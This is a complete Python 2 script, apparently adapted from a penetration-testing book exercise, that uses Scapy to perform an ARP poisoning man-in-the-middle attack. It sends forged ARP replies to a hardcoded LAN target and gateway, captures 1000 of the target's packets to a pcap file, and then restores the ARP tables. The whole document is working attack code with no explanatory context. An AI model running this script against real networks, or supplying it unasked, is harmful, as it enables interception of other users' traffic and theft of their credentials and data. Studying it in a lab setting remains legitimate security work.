import os
import sys
import signal
import time
import threading
from scapy.all import *

import Queue
PID = os.getpid()
goon = Queue.Queue()
goon.put(1)

# as long as the queue is not empty poison_target will continue
a = Queue.Queue()
a.put(1)

def get_mac(ip_address):
    responses, unanswered = \
            srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_address),\
            timeout=2, retry=10)
    # return the MAC address from a response
    for s,r in responses:
        return r[Ether].src

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print "[*] Restoring target...",
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,\
            hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac))
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,\
            hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac))
    os.system('kill %d'%os.getpid())
    print 'Done!'
    # signal the main thread to exti
    return

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip,\
            hwdst = target_mac)
    poison_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip,\
            hwdst = gateway_mac)

    print "[*] Beginning the ARP poison. PID = %d. [CTRL-C to stop]" \
            % os.getpid()

    while not goon.empty():
        #try:
        send(poison_target)
        send(poison_gateway)

        time.sleep(2)
        #except KeyboardInterrupt:
        #    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        #    break
    print "[*] ARP poison attack finished"
    return

interface    = 'wlo1'
target_ip    = '192.168.0.108'
gateway_ip   = '192.168.0.1'
packet_count = 1000

# set our interface
conf.iface = interface

# turn off output
conf.verb = 0

print "[*] Setting up %s. PID = %d" % (interface, os.getpid())

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print "[!!!] Failed to get gateway MAC. Exitting."
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s " %(gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)
if target_mac is None:
    print "[!!!] Failed to get target MAC. Exitting."
    sys.exit(0)
else:
    print "[*] Target %s is at %s " %(target_ip, target_mac)

# start poison thread
poison_thread = threading.Thread(target=poison_target, \
        args = (gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()
try:
    print '[*] Starting sniffer for %d packets' % packet_count
    bpf_filter = 'ip host %s'%target_ip
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
    # write out the captured packets
    wrpcap('arper.pcap', packets)
    print '[*] Finished sniffing'
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    a.get()
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
